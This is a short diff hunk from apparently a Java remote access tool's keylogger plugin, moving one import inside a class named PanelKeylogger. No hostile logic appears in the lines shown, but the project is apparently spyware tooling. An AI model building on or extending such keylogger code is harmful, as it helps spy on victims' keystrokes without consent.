@@ -35,8 +35,8 @@ import javax.swing.tree.DefaultTreeModel;
 import se.jrat.plugin.keylogger.client.KeyloggerPlugin;
 import se.jrat.plugin.keylogger.client.HeartbeatThread;
 import jrat.api.BaseControlPanel;
-import jrat.api.PacketBuilder;
 import jrat.api.Client;
+import jrat.api.net.PacketBuilder;
 
 @SuppressWarnings("serial")
 public class PanelKeylogger extends BaseControlPanel {
